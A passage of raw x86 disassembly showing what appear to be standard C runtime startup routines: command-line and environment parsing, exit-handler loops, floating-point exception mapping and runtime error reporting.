  422b43:	call   0x42354f
  422b48:	test   eax,eax
  422b4a:	jge    0x422b54
  422b4c:	push   0x1b
  422b4e:	call   0x422a06
  422b53:	pop    ecx
  422b54:	call   DWORD PTR ds:0x42800c
  422b5a:	mov    ds:0x460354,eax
  422b5f:	call   0x42342d
  422b64:	mov    ds:0x45fb94,eax
  422b69:	call   0x42338b
  422b6e:	test   eax,eax
  422b70:	jge    0x422b7a
  422b72:	push   0x8
  422b74:	call   0x422a06
  422b79:	pop    ecx
  422b7a:	call   0x423158
  422b7f:	test   eax,eax
  422b81:	jge    0x422b8b
  422b83:	push   0x9
  422b85:	call   0x422a06
  422b8a:	pop    ecx
  422b8b:	call   0x422c63
  422b90:	mov    DWORD PTR [ebp-0x20],eax
  422b93:	cmp    eax,esi
  422b95:	je     0x422b9e
  422b97:	push   eax
  422b98:	call   0x422a06
  422b9d:	pop    ecx
  422b9e:	mov    DWORD PTR [ebp-0x38],esi
  422ba1:	lea    eax,[ebp-0x64]
  422ba4:	push   eax
  422ba5:	call   DWORD PTR ds:0x428058
  422bab:	call   0x4230ef
  422bb0:	mov    DWORD PTR [ebp-0x68],eax
  422bb3:	test   BYTE PTR [ebp-0x38],0x1
  422bb7:	je     0x422bbf
  422bb9:	movzx  eax,WORD PTR [ebp-0x34]
  422bbd:	jmp    0x422bc2
  422bbf:	push   0xa
  422bc1:	pop    eax
  422bc2:	push   eax
  422bc3:	push   DWORD PTR [ebp-0x68]
  422bc6:	push   esi
  422bc7:	push   esi
  422bc8:	call   edi
  422bca:	push   eax
  422bcb:	call   0x421850
  422bd0:	mov    edi,eax
  422bd2:	mov    DWORD PTR [ebp-0x6c],edi
  422bd5:	cmp    DWORD PTR [ebp-0x1c],esi
  422bd8:	jne    0x422be0
  422bda:	push   edi
  422bdb:	call   0x422d9b
  422be0:	call   0x422dbd
  422be5:	jmp    0x422c12
  422be7:	mov    eax,DWORD PTR [ebp-0x14]
  422bea:	mov    ecx,DWORD PTR [eax]
  422bec:	mov    ecx,DWORD PTR [ecx]
  422bee:	mov    DWORD PTR [ebp-0x70],ecx
  422bf1:	push   eax
  422bf2:	push   ecx
  422bf3:	call   0x422f8b
  422bf8:	pop    ecx
  422bf9:	pop    ecx
  422bfa:	ret    
  422bfb:	mov    esp,DWORD PTR [ebp-0x18]
  422bfe:	mov    edi,DWORD PTR [ebp-0x70]
  422c01:	cmp    DWORD PTR [ebp-0x1c],0x0
  422c05:	jne    0x422c0d
  422c07:	push   edi
  422c08:	call   0x422dac
  422c0d:	call   0x422dcc
  422c12:	or     DWORD PTR [ebp-0x4],0xffffffff
  422c16:	mov    eax,edi
  422c18:	lea    esp,[ebp-0x7c]
  422c1b:	call   0x42397b
  422c20:	ret    
  422c21:	push   0x42816c
  422c26:	call   DWORD PTR ds:0x428014
  422c2c:	test   eax,eax
  422c2e:	je     0x422c46
  422c30:	push   0x42815c
  422c35:	push   eax
  422c36:	call   DWORD PTR ds:0x428010
  422c3c:	test   eax,eax
  422c3e:	je     0x422c46
  422c40:	push   DWORD PTR [esp+0x4]
  422c44:	call   eax
  422c46:	push   DWORD PTR [esp+0x4]
  422c4a:	call   DWORD PTR ds:0x428060
  422c50:	int3   
  422c51:	push   0x8
  422c53:	call   0x423aff
  422c58:	pop    ecx
  422c59:	ret    
  422c5a:	push   0x8
  422c5c:	call   0x423a6b
  422c61:	pop    ecx
  422c62:	ret    
  422c63:	mov    eax,ds:0x460350
  422c68:	test   eax,eax
  422c6a:	je     0x422c6e
  422c6c:	call   eax
  422c6e:	push   esi
  422c6f:	push   edi
  422c70:	mov    ecx,0x42a00c
  422c75:	mov    edi,0x42a018
  422c7a:	xor    eax,eax
  422c7c:	cmp    ecx,edi
  422c7e:	mov    esi,ecx
  422c80:	jae    0x422c99
  422c82:	test   eax,eax
  422c84:	jne    0x422cc5
  422c86:	mov    ecx,DWORD PTR [esi]
  422c88:	test   ecx,ecx
  422c8a:	je     0x422c8e
  422c8c:	call   ecx
  422c8e:	add    esi,0x4
  422c91:	cmp    esi,edi
  422c93:	jb     0x422c82
  422c95:	test   eax,eax
  422c97:	jne    0x422cc5
  422c99:	push   0x423791
  422c9e:	call   0x423c10
  422ca3:	mov    esi,0x42a000
  422ca8:	mov    eax,esi
  422caa:	mov    edi,0x42a008
  422caf:	cmp    eax,edi
  422cb1:	pop    ecx
  422cb2:	jae    0x422cc3
  422cb4:	mov    eax,DWORD PTR [esi]
  422cb6:	test   eax,eax
  422cb8:	je     0x422cbc
  422cba:	call   eax
  422cbc:	add    esi,0x4
  422cbf:	cmp    esi,edi
  422cc1:	jb     0x422cb4
  422cc3:	xor    eax,eax
  422cc5:	pop    edi
  422cc6:	pop    esi
  422cc7:	ret    
  422cc8:	push   ebp
  422cc9:	mov    ebp,esp
  422ccb:	push   esi
  422ccc:	push   edi
  422ccd:	push   0x8
  422ccf:	call   0x423aff
  422cd4:	xor    esi,esi
  422cd6:	inc    esi
  422cd7:	cmp    DWORD PTR ds:0x45fbe4,esi
  422cdd:	pop    ecx
  422cde:	jne    0x422cf0
  422ce0:	push   DWORD PTR [ebp+0x8]
  422ce3:	call   DWORD PTR ds:0x428068
  422ce9:	push   eax
  422cea:	call   DWORD PTR ds:0x428064
  422cf0:	cmp    DWORD PTR [ebp+0xc],0x0
  422cf4:	mov    al,BYTE PTR [ebp+0x10]
  422cf7:	mov    DWORD PTR ds:0x45fbe0,esi
  422cfd:	mov    ds:0x45fbdc,al
  422d02:	jne    0x422d56
  422d04:	mov    ecx,DWORD PTR ds:0x460348
  422d0a:	test   ecx,ecx
  422d0c:	je     0x422d37
  422d0e:	mov    eax,ds:0x460344
  422d13:	sub    eax,0x4
  422d16:	cmp    eax,ecx
  422d18:	jmp    0x422d30
  422d1a:	mov    eax,DWORD PTR [eax]
  422d1c:	test   eax,eax
  422d1e:	je     0x422d22
  422d20:	call   eax
  422d22:	mov    eax,ds:0x460344
  422d27:	sub    eax,0x4
  422d2a:	cmp    eax,DWORD PTR ds:0x460348
  422d30:	mov    ds:0x460344,eax
  422d35:	jae    0x422d1a
  422d37:	mov    eax,0x42a01c
  422d3c:	mov    esi,0x42a020
  422d41:	cmp    eax,esi
  422d43:	mov    edi,eax
  422d45:	jae    0x422d56
  422d47:	mov    eax,DWORD PTR [edi]
  422d49:	test   eax,eax
  422d4b:	je     0x422d4f
  422d4d:	call   eax
  422d4f:	add    edi,0x4
  422d52:	cmp    edi,esi
  422d54:	jb     0x422d47
  422d56:	mov    eax,0x42a024
  422d5b:	mov    esi,0x42a028
  422d60:	cmp    eax,esi
  422d62:	mov    edi,eax
  422d64:	jae    0x422d75
  422d66:	mov    eax,DWORD PTR [edi]
  422d68:	test   eax,eax
  422d6a:	je     0x422d6e
  422d6c:	call   eax
  422d6e:	add    edi,0x4
  422d71:	cmp    edi,esi
  422d73:	jb     0x422d66
  422d75:	cmp    DWORD PTR [ebp+0x10],0x0
  422d79:	pop    edi
  422d7a:	pop    esi
  422d7b:	je     0x422d86
  422d7d:	push   0x8
  422d7f:	call   0x423a6b
  422d84:	jmp    0x422d98
  422d86:	push   DWORD PTR [ebp+0x8]
  422d89:	mov    DWORD PTR ds:0x45fbe4,0x1
  422d93:	call   0x422c21
  422d98:	pop    ecx
  422d99:	pop    ebp
  422d9a:	ret    
  422d9b:	push   0x0
  422d9d:	push   0x0
  422d9f:	push   DWORD PTR [esp+0xc]
  422da3:	call   0x422cc8
  422da8:	add    esp,0xc
  422dab:	ret    
  422dac:	push   0x0
  422dae:	push   0x1
  422db0:	push   DWORD PTR [esp+0xc]
  422db4:	call   0x422cc8
  422db9:	add    esp,0xc
  422dbc:	ret    
  422dbd:	push   0x1
  422dbf:	push   0x0
  422dc1:	push   0x0
  422dc3:	call   0x422cc8
  422dc8:	add    esp,0xc
  422dcb:	ret    
  422dcc:	push   0x1
  422dce:	push   0x1
  422dd0:	push   0x0
  422dd2:	call   0x422cc8
  422dd7:	add    esp,0xc
  422dda:	ret    
  422ddb:	push   ebp
  422ddc:	mov    ebp,esp
  422dde:	sub    esp,0x10c
  422de4:	mov    eax,ds:0x45f510
  422de9:	xor    eax,DWORD PTR [ebp+0x4]
  422dec:	mov    ecx,DWORD PTR [ebp+0x8]
  422def:	push   ebx
  422df0:	push   esi
  422df1:	mov    DWORD PTR [ebp-0x4],eax
  422df4:	xor    edx,edx
  422df6:	push   edi
  422df7:	xor    eax,eax
  422df9:	cmp    ecx,DWORD PTR [eax*8+0x45f2a0]
  422e00:	je     0x422e08
  422e02:	inc    eax
  422e03:	cmp    eax,0x12
  422e06:	jb     0x422df9
  422e08:	mov    esi,eax
  422e0a:	shl    esi,0x3
  422e0d:	cmp    ecx,DWORD PTR [esi+0x45f2a0]
  422e13:	jne    0x422f3c
  422e19:	mov    eax,ds:0x45fb9c
  422e1e:	cmp    eax,0x1
  422e21:	je     0x422f17
  422e27:	cmp    eax,edx
  422e29:	jne    0x422e38
  422e2b:	cmp    DWORD PTR ds:0x45f298,0x1
  422e32:	je     0x422f17
  422e38:	cmp    ecx,0xfc
  422e3e:	je     0x422f3c
  422e44:	push   0x104
  422e49:	lea    eax,[ebp-0x10c]
  422e4f:	push   eax
  422e50:	push   edx
  422e51:	mov    BYTE PTR [ebp-0x8],dl
  422e54:	call   DWORD PTR ds:0x428074
  422e5a:	test   eax,eax
  422e5c:	jne    0x422e71
  422e5e:	lea    eax,[ebp-0x10c]
  422e64:	push   0x4284c4
  422e69:	push   eax
  422e6a:	call   0x423d20
  422e6f:	pop    ecx
  422e70:	pop    ecx
  422e71:	lea    eax,[ebp-0x10c]
  422e77:	push   eax
  422e78:	lea    edi,[ebp-0x10c]
  422e7e:	call   0x423f50
  422e83:	inc    eax
  422e84:	cmp    eax,0x3c
  422e87:	pop    ecx
  422e88:	jbe    0x422eb3
  422e8a:	lea    eax,[ebp-0x10c]
  422e90:	push   eax
  422e91:	call   0x423f50
  422e96:	mov    edi,eax
  422e98:	lea    eax,[ebp-0x10c]
  422e9e:	sub    eax,0x3b
  422ea1:	push   0x3
  422ea3:	add    edi,eax
  422ea5:	push   0x4284c0
  422eaa:	push   edi
  422eab:	call   0x423e20
  422eb0:	add    esp,0x10
  422eb3:	push   edi
  422eb4:	call   0x423f50
  422eb9:	push   DWORD PTR [esi+0x45f2a4]
  422ebf:	mov    ebx,eax
  422ec1:	call   0x423f50
  422ec6:	lea    eax,[ebx+eax*1+0x1c]
  422eca:	pop    ecx
  422ecb:	add    eax,0x3
  422ece:	pop    ecx
  422ecf:	and    eax,0xfffffffc
  422ed2:	call   0x423990
  422ed7:	mov    ebx,esp
  422ed9:	push   0x4284a4
  422ede:	push   ebx
  422edf:	call   0x423d20
  422ee4:	push   edi
  422ee5:	push   ebx
  422ee6:	call   0x423d30
  422eeb:	push   0x4284a0
  422ef0:	push   ebx
  422ef1:	call   0x423d30
  422ef6:	push   DWORD PTR [esi+0x45f2a4]
  422efc:	push   ebx
  422efd:	call   0x423d30
  422f02:	push   0x12010
  422f07:	push   0x428478
  422f0c:	push   ebx
  422f0d:	call   0x423c22
  422f12:	add    esp,0x2c
  422f15:	jmp    0x422f3c
  422f17:	push   edx
  422f18:	lea    eax,[ebp+0x8]
  422f1b:	push   eax
  422f1c:	lea    esi,[esi+0x45f2a4]
  422f22:	push   DWORD PTR [esi]
  422f24:	call   0x423f50
  422f29:	pop    ecx
  422f2a:	push   eax
  422f2b:	push   DWORD PTR [esi]
  422f2d:	push   0xfffffff4
  422f2f:	call   DWORD PTR ds:0x428070
  422f35:	push   eax
  422f36:	call   DWORD PTR ds:0x42806c
  422f3c:	lea    esp,[ebp-0x118]
  422f42:	mov    ecx,DWORD PTR [ebp-0x4]
  422f45:	xor    ecx,DWORD PTR [ebp+0x4]
  422f48:	call   0x42400c
  422f4d:	pop    edi
  422f4e:	pop    esi
  422f4f:	pop    ebx
  422f50:	leave  
  422f51:	ret    
  422f52:	mov    eax,ds:0x45fb9c
  422f57:	cmp    eax,0x1
  422f5a:	je     0x422f69
  422f5c:	test   eax,eax
  422f5e:	jne    0x422f8a
  422f60:	cmp    DWORD PTR ds:0x45f298,0x1
  422f67:	jne    0x422f8a
  422f69:	push   0xfc
  422f6e:	call   0x422ddb
  422f73:	mov    eax,ds:0x45fbe8
  422f78:	test   eax,eax
  422f7a:	pop    ecx
  422f7b:	je     0x422f7f
  422f7d:	call   eax
  422f7f:	push   0xff
  422f84:	call   0x422ddb
  422f89:	pop    ecx
  422f8a:	ret    
  422f8b:	push   ebp
  422f8c:	mov    ebp,esp
  422f8e:	push   ecx
  422f8f:	push   ebx
  422f90:	push   esi
  422f91:	push   edi
  422f92:	call   0x4237f3
  422f97:	mov    edi,DWORD PTR [ebp+0x8]
  422f9a:	mov    esi,eax
  422f9c:	mov    edx,DWORD PTR [esi+0x54]
  422f9f:	mov    eax,ds:0x45f3b4
  422fa4:	mov    ecx,edx
  422fa6:	cmp    DWORD PTR [ecx],edi
  422fa8:	je     0x422fb7
  422faa:	lea    ebx,[eax+eax*2]
  422fad:	add    ecx,0xc
  422fb0:	lea    ebx,[edx+ebx*4]
  422fb3:	cmp    ecx,ebx
  422fb5:	jb     0x422fa6
  422fb7:	lea    eax,[eax+eax*2]
  422fba:	lea    eax,[edx+eax*4]
  422fbd:	cmp    ecx,eax
  422fbf:	jae    0x422fc5
  422fc1:	cmp    DWORD PTR [ecx],edi
  422fc3:	je     0x422fc7
  422fc5:	xor    ecx,ecx
  422fc7:	test   ecx,ecx
  422fc9:	je     0x4230e1
  422fcf:	mov    ebx,DWORD PTR [ecx+0x8]
  422fd2:	test   ebx,ebx
  422fd4:	mov    DWORD PTR [ebp+0x8],ebx
  422fd7:	je     0x4230e1
  422fdd:	cmp    ebx,0x5
  422fe0:	jne    0x422fee
  422fe2:	and    DWORD PTR [ecx+0x8],0x0
  422fe6:	xor    eax,eax
  422fe8:	inc    eax
  422fe9:	jmp    0x4230ea
  422fee:	cmp    ebx,0x1
  422ff1:	je     0x4230dc
  422ff7:	mov    eax,DWORD PTR [esi+0x58]
  422ffa:	mov    DWORD PTR [ebp-0x4],eax
  422ffd:	mov    eax,DWORD PTR [ebp+0xc]
  423000:	mov    DWORD PTR [esi+0x58],eax
  423003:	mov    eax,DWORD PTR [ecx+0x4]
  423006:	cmp    eax,0x8
  423009:	jne    0x4230ce
  42300f:	mov    edx,DWORD PTR ds:0x45f3a8
  423015:	mov    eax,ds:0x45f3ac
  42301a:	add    eax,edx
  42301c:	cmp    edx,eax
  42301e:	jge    0x423047
  423020:	lea    eax,[edx+edx*2]
  423023:	shl    eax,0x2
  423026:	mov    edi,DWORD PTR [esi+0x54]
  423029:	and    DWORD PTR [eax+edi*1+0x8],0x0
  42302e:	mov    edi,DWORD PTR ds:0x45f3a8
  423034:	mov    ebx,DWORD PTR ds:0x45f3ac
  42303a:	inc    edx
  42303b:	add    ebx,edi
  42303d:	add    eax,0xc
  423040:	cmp    edx,ebx
  423042:	jl     0x423026
  423044:	mov    ebx,DWORD PTR [ebp+0x8]
  423047:	mov    ecx,DWORD PTR [ecx]
  423049:	cmp    ecx,0xc000008e
  42304f:	mov    edi,DWORD PTR [esi+0x5c]
  423052:	jne    0x42305d
  423054:	mov    DWORD PTR [esi+0x5c],0x83
  42305b:	jmp    0x4230c1
  42305d:	cmp    ecx,0xc0000090
  423063:	jne    0x42306e
  423065:	mov    DWORD PTR [esi+0x5c],0x81
  42306c:	jmp    0x4230c1
  42306e:	cmp    ecx,0xc0000091
  423074:	jne    0x42307f
  423076:	mov    DWORD PTR [esi+0x5c],0x84
  42307d:	jmp    0x4230c1
  42307f:	cmp    ecx,0xc0000093
  423085:	jne    0x423090
  423087:	mov    DWORD PTR [esi+0x5c],0x85
  42308e:	jmp    0x4230c1
  423090:	cmp    ecx,0xc000008d
  423096:	jne    0x4230a1
  423098:	mov    DWORD PTR [esi+0x5c],0x82
  42309f:	jmp    0x4230c1
  4230a1:	cmp    ecx,0xc000008f
  4230a7:	jne    0x4230b2
  4230a9:	mov    DWORD PTR [esi+0x5c],0x86
  4230b0:	jmp    0x4230c1
  4230b2:	cmp    ecx,0xc0000092
  4230b8:	jne    0x4230c1
  4230ba:	mov    DWORD PTR [esi+0x5c],0x8a
  4230c1:	push   DWORD PTR [esi+0x5c]
  4230c4:	push   0x8
  4230c6:	call   ebx
  4230c8:	pop    ecx
  4230c9:	mov    DWORD PTR [esi+0x5c],edi
  4230cc:	jmp    0x4230d5
  4230ce:	and    DWORD PTR [ecx+0x8],0x0
  4230d2:	push   eax
  4230d3:	call   ebx
  4230d5:	mov    eax,DWORD PTR [ebp-0x4]
  4230d8:	pop    ecx
  4230d9:	mov    DWORD PTR [esi+0x58],eax
  4230dc:	or     eax,0xffffffff
  4230df:	jmp    0x4230ea
  4230e1:	push   DWORD PTR [ebp+0xc]
  4230e4:	call   DWORD PTR ds:0x428078
  4230ea:	pop    edi
  4230eb:	pop    esi
  4230ec:	pop    ebx
  4230ed:	leave  
  4230ee:	ret    
  4230ef:	cmp    DWORD PTR ds:0x46034c,0x0
  4230f6:	jne    0x4230fd
  4230f8:	call   0x42452c
  4230fd:	push   esi
  4230fe:	mov    esi,DWORD PTR ds:0x460354
  423104:	test   esi,esi
  423106:	jne    0x42310f
  423108:	mov    esi,0x4284db
  42310d:	jmp    0x423154
  42310f:	mov    al,BYTE PTR [esi]
  423111:	cmp    al,0x22
  423113:	jne    0x42313d
  423115:	inc    esi
  423116:	mov    al,BYTE PTR [esi]
  423118:	cmp    al,0x22
  42311a:	je     0x42314d
  42311c:	test   al,al
  42311e:	je     0x423136
  423120:	movzx  eax,al
  423123:	push   eax
  423124:	call   0x42404b
  423129:	test   eax,eax
  42312b:	pop    ecx
  42312c:	je     0x42312f
  42312e:	inc    esi
  42312f:	inc    esi
  423130:	mov    al,BYTE PTR [esi]
  423132:	cmp    al,0x22
  423134:	jne    0x42311c
  423136:	cmp    BYTE PTR [esi],0x22
  423139:	jne    0x42314e
  42313b:	jmp    0x42314d
  42313d:	cmp    al,0x20
  42313f:	jbe    0x42314e
  423141:	inc    esi
  423142:	cmp    BYTE PTR [esi],0x20
  423145:	ja     0x423141
  423147:	jmp    0x42314e
  423149:	cmp    al,0x20
  42314b:	ja     0x423154
  42314d:	inc    esi
  42314e:	mov    al,BYTE PTR [esi]
  423150:	test   al,al
  423152:	jne    0x423149
  423154:	mov    eax,esi
  423156:	pop    esi
  423157:	ret    
  423158:	push   ebx
  423159:	xor    ebx,ebx
  42315b:	cmp    DWORD PTR ds:0x46034c,ebx
  423161:	push   esi
  423162:	push   edi
  423163:	jne    0x42316a
  423165:	call   0x42452c
  42316a:	mov    esi,DWORD PTR ds:0x45fb94
  423170:	xor    edi,edi
  423172:	cmp    esi,ebx
  423174:	jne    0x423188
  423176:	jmp    0x4231a8
  423178:	cmp    al,0x3d
  42317a:	je     0x42317d
  42317c:	inc    edi
  42317d:	push   esi
  42317e:	call   0x423f50
  423183:	pop    ecx
  423184:	lea    esi,[esi+eax*1+0x1]
  423188:	mov    al,BYTE PTR [esi]
  42318a:	cmp    al,bl
  42318c:	jne    0x423178
  42318e:	lea    eax,[edi*4+0x4]
  423195:	push   eax
  423196:	call   0x424662
  42319b:	mov    edi,eax
  42319d:	cmp    edi,ebx
  42319f:	pop    ecx
  4231a0:	mov    DWORD PTR ds:0x45fbc4,edi
  4231a6:	jne    0x4231ad
  4231a8:	or     eax,0xffffffff
  4231ab:	jmp    0x423205
  4231ad:	mov    esi,DWORD PTR ds:0x45fb94
  4231b3:	push   ebp
  4231b4:	jmp    0x4231e0
  4231b6:	push   esi
  4231b7:	call   0x423f50
  4231bc:	mov    ebp,eax
  4231be:	inc    ebp
  4231bf:	cmp    BYTE PTR [esi],0x3d
  4231c2:	pop    ecx
  4231c3:	je     0x4231de
  4231c5:	push   ebp
  4231c6:	call   0x424662
  4231cb:	cmp    eax,ebx
  4231cd:	pop    ecx
  4231ce:	mov    DWORD PTR [edi],eax
  4231d0:	je     0x423209
  4231d2:	push   esi
  4231d3:	push   eax
  4231d4:	call   0x423d20
  4231d9:	pop    ecx
  4231da:	pop    ecx
  4231db:	add    edi,0x4
  4231de:	add    esi,ebp
  4231e0:	cmp    BYTE PTR [esi],bl
  4231e2:	jne    0x4231b6
  4231e4:	push   DWORD PTR ds:0x45fb94
  4231ea:	call   0x42454a
  4231ef:	mov    DWORD PTR ds:0x45fb94,ebx
  4231f5:	mov    DWORD PTR [edi],ebx
  4231f7:	mov    DWORD PTR ds:0x460340,0x1
  423201:	xor    eax,eax
  423203:	pop    ecx
  423204:	pop    ebp
  423205:	pop    edi
  423206:	pop    esi
  423207:	pop    ebx
  423208:	ret    
  423209:	push   DWORD PTR ds:0x45fbc4
  42320f:	call   0x42454a
  423214:	mov    DWORD PTR ds:0x45fbc4,ebx
  42321a:	or     eax,0xffffffff
  42321d:	jmp    0x423203
  42321f:	push   ebp
  423220:	mov    ebp,esp
  423222:	push   ecx
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0xc]
  423227:	xor    edx,edx
  423229:	cmp    DWORD PTR [ebp+0x8],edx
  42322c:	push   edi
  42322d:	mov    DWORD PTR [esi],edx
  42322f:	mov    edi,ecx
  423231:	mov    DWORD PTR [ebx],0x1
  423237:	je     0x423242
  423239:	mov    ecx,DWORD PTR [ebp+0x8]
  42323c:	add    DWORD PTR [ebp+0x8],0x4
  423240:	mov    DWORD PTR [ecx],edi
  423242:	cmp    BYTE PTR [eax],0x22
  423245:	jne    0x423255
  423247:	xor    ecx,ecx
  423249:	test   edx,edx
  42324b:	sete   cl
  42324e:	inc    eax
  42324f:	mov    edx,ecx
  423251:	mov    cl,0x22
  423253:	jmp    0x423282
  423255:	inc    DWORD PTR [esi]
  423257:	test   edi,edi
  423259:	je     0x423260
  42325b:	mov    cl,BYTE PTR [eax]
  42325d:	mov    BYTE PTR [edi],cl
  42325f:	inc    edi
  423260:	mov    cl,BYTE PTR [eax]
  423262:	movzx  ebx,cl
  423265:	inc    eax
  423266:	test   BYTE PTR [ebx+0x460001],0x4
  42326d:	je     0x42327b
  42326f:	inc    DWORD PTR [esi]
  423271:	test   edi,edi
  423273:	je     0x42327a
  423275:	mov    bl,BYTE PTR [eax]
  423277:	mov    BYTE PTR [edi],bl
  423279:	inc    edi
  42327a:	inc    eax
  42327b:	test   cl,cl
  42327d:	mov    ebx,DWORD PTR [ebp+0xc]
  423280:	je     0x4232b4
  423282:	test   edx,edx
  423284:	jne    0x423242
  423286:	cmp    cl,0x20
  423289:	je     0x423290
  42328b:	cmp    cl,0x9
  42328e:	jne    0x423242
  423290:	test   edi,edi
  423292:	je     0x423298
  423294:	and    BYTE PTR [edi-0x1],0x0
  423298:	and    DWORD PTR [ebp-0x4],0x0
  42329c:	cmp    BYTE PTR [eax],0x0
  42329f:	je     0x42337b
  4232a5:	mov    cl,BYTE PTR [eax]
  4232a7:	cmp    cl,0x20
  4232aa:	je     0x4232b1
  4232ac:	cmp    cl,0x9
  4232af:	jne    0x4232b7
  4232b1:	inc    eax
  4232b2:	jmp    0x4232a5
  4232b4:	dec    eax
  4232b5:	jmp    0x423298
  4232b7:	cmp    BYTE PTR [eax],0x0
  4232ba:	je     0x42337b
  4232c0:	cmp    DWORD PTR [ebp+0x8],0x0
  4232c4:	je     0x4232cf
  4232c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4232c9:	add    DWORD PTR [ebp+0x8],0x4
  4232cd:	mov    DWORD PTR [ecx],edi
  4232cf:	inc    DWORD PTR [ebx]
  4232d1:	xor    ebx,ebx
  4232d3:	inc    ebx
  4232d4:	xor    edx,edx
  4232d6:	jmp    0x4232da
  4232d8:	inc    eax
  4232d9:	inc    edx
  4232da:	cmp    BYTE PTR [eax],0x5c
  4232dd:	je     0x4232d8
  4232df:	cmp    BYTE PTR [eax],0x22
  4232e2:	jne    0x42330a
  4232e4:	test   dl,0x1
  4232e7:	jne    0x423308
  4232e9:	cmp    DWORD PTR [ebp-0x4],0x0
  4232ed:	je     0x4232fb
  4232ef:	lea    ecx,[eax+0x1]
  4232f2:	cmp    BYTE PTR [ecx],0x22
  4232f5:	jne    0x4232fb
  4232f7:	mov    eax,ecx
  4232f9:	jmp    0x4232fd
  4232fb:	xor    ebx,ebx
  4232fd:	xor    ecx,ecx
  4232ff:	cmp    DWORD PTR [ebp-0x4],ecx
  423302:	sete   cl
  423305:	mov    DWORD PTR [ebp-0x4],ecx
  423308:	shr    edx,1
  42330a:	test   edx,edx
  42330c:	je     0x42331b
  42330e:	test   edi,edi
  423310:	je     0x423316
  423312:	mov    BYTE PTR [edi],0x5c
  423315:	inc    edi
  423316:	inc    DWORD PTR [esi]
  423318:	dec    edx
  423319:	jne    0x42330e
  42331b:	mov    cl,BYTE PTR [eax]
  42331d:	test   cl,cl
  42331f:	je     0x423369
  423321:	cmp    DWORD PTR [ebp-0x4],0x0
  423325:	jne    0x423331
  423327:	cmp    cl,0x20
  42332a:	je     0x423369
  42332c:	cmp    cl,0x9
  42332f:	je     0x423369
  423331:	test   ebx,ebx
  423333:	je     0x423363
  423335:	test   edi,edi
  423337:	je     0x423352
  423339:	movzx  edx,cl
  42333c:	test   BYTE PTR [edx+0x460001],0x4
  423343:	je     0x42334b
  423345:	mov    BYTE PTR [edi],cl
  423347:	inc    edi
  423348:	inc    eax
  423349:	inc    DWORD PTR [esi]
  42334b:	mov    cl,BYTE PTR [eax]
  42334d:	mov    BYTE PTR [edi],cl
  42334f:	inc    edi
  423350:	jmp    0x423361
  423352:	movzx  ecx,cl
  423355:	test   BYTE PTR [ecx+0x460001],0x4
  42335c:	je     0x423361
  42335e:	inc    eax
  42335f:	inc    DWORD PTR [esi]
  423361:	inc    DWORD PTR [esi]
  423363:	inc    eax
  423364:	jmp    0x4232d1
  423369:	test   edi,edi
  42336b:	je     0x423371
  42336d:	and    BYTE PTR [edi],0x0
  423370:	inc    edi
  423371:	inc    DWORD PTR [esi]
  423373:	mov    ebx,DWORD PTR [ebp+0xc]
  423376:	jmp    0x42329c
  42337b:	mov    eax,DWORD PTR [ebp+0x8]
  42337e:	test   eax,eax
  423380:	je     0x423385
  423382:	and    DWORD PTR [eax],0x0
  423385:	inc    DWORD PTR [ebx]
  423387:	pop    edi
  423388:	pop    ebx
  423389:	leave  
  42338a:	ret    
  42338b:	push   ebp
  42338c:	mov    ebp,esp
  42338e:	push   ecx
  42338f:	push   ecx
  423390:	push   ebx
  423391:	push   esi
  423392:	push   edi
  423393:	xor    edi,edi
  423395:	cmp    DWORD PTR ds:0x46034c,edi
  42339b:	jne    0x4233a2
  42339d:	call   0x42452c
  4233a2:	and    BYTE PTR ds:0x45fcf4,0x0
  4233a9:	push   0x104
  4233ae:	mov    esi,0x45fbf0
  4233b3:	push   esi
  4233b4:	push   edi
  4233b5:	call   DWORD PTR ds:0x428074
  4233bb:	mov    eax,ds:0x460354
  4233c0:	cmp    eax,edi
  4233c2:	mov    DWORD PTR ds:0x45fbd4,esi
  4233c8:	je     0x4233d1
  4233ca:	cmp    BYTE PTR [eax],0x0
  4233cd:	mov    ebx,eax
  4233cf:	jne    0x4233d3
  4233d1:	mov    ebx,esi
  4233d3:	lea    eax,[ebp-0x4]
  4233d6:	push   eax
  4233d7:	push   edi
  4233d8:	lea    esi,[ebp-0x8]
  4233db:	xor    ecx,ecx
  4233dd:	mov    eax,ebx
  4233df:	call   0x42321f
  4233e4:	mov    esi,DWORD PTR [ebp-0x4]
  4233e7:	mov    eax,DWORD PTR [ebp-0x8]
  4233ea:	shl    esi,0x2
  4233ed:	add    eax,esi
  4233ef:	push   eax
  4233f0:	call   0x424662
  4233f5:	mov    edi,eax
  4233f7:	add    esp,0xc
  4233fa:	test   edi,edi
  4233fc:	jne    0x423403
  4233fe:	or     eax,0xffffffff
  423401:	jmp    0x423428
  423403:	lea    eax,[ebp-0x4]
  423406:	push   eax
  423407:	lea    ecx,[esi+edi*1]
  42340a:	push   edi
  42340b:	lea    esi,[ebp-0x8]
  42340e:	mov    eax,ebx
  423410:	call   0x42321f
  423415:	mov    eax,DWORD PTR [ebp-0x4]
  423418:	dec    eax
  423419:	pop    ecx
  42341a:	mov    ds:0x45fbb8,eax
  42341f:	pop    ecx
  423420:	mov    DWORD PTR ds:0x45fbbc,edi
  423426:	xor    eax,eax
  423428:	pop    edi
  423429:	pop    esi
  42342a:	pop    ebx
  42342b:	leave  
  42342c:	ret    
  42342d:	push   ecx
  42342e:	push   ecx
  42342f:	mov    eax,ds:0x45fcf8
  423434:	push   ebx
  423435:	push   ebp
  423436:	push   esi
  423437:	push   edi
  423438:	mov    edi,DWORD PTR ds:0x42808c
  42343e:	xor    ebx,ebx
  423440:	xor    esi,esi
  423442:	cmp    eax,ebx
  423444:	push   0x2
  423446:	pop    ebp
  423447:	jne    0x423476
  423449:	call   edi
  42344b:	mov    esi,eax
  42344d:	cmp    esi,ebx
  42344f:	je     0x42345d
  423451:	mov    DWORD PTR ds:0x45fcf8,0x1
  42345b:	jmp    0x42347b
  42345d:	call   DWORD PTR ds:0x428018
  423463:	cmp    eax,0x78
  423466:	jne    0x423471
  423468:	mov    eax,ebp
  42346a:	mov    ds:0x45fcf8,eax
  42346f:	jmp    0x423476
  423471:	mov    eax,ds:0x45fcf8
  423476:	cmp    eax,0x1
  423479:	jne    0x4234f8
  42347b:	cmp    esi,ebx
  42347d:	jne    0x423487
  42347f:	call   edi
  423481:	mov    esi,eax
  423483:	cmp    esi,ebx
  423485:	je     0x423500
  423487:	cmp    WORD PTR [esi],bx
  42348a:	mov    eax,esi
  42348c:	je     0x42349c
  42348e:	add    eax,ebp
  423490:	cmp    WORD PTR [eax],bx
  423493:	jne    0x42348e
